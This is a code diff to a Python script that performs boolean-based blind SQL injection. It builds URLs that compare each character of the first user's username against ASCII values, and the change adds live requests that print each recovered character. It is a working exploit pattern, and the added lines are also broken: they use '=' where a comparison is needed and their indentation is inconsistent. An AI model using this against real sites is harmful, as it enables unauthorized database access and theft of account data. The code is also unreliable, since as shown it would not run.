@@ -161,7 +161,11 @@ def makeSQLI():
 		for character in range(33,126):
 			sqli_url = main_url + "?id=9 or (select(select ascii(substring(username,%d,1)) from users where id = 1)=%d)" % (position, character)
 			
-			print(sqli_url)
+		    r = requests.get(sqli_url)
+		    
+		    if r.status_code = 200:
+			    print(chr(character))
+			    break
 	
 
 if __name__ == '__main__':
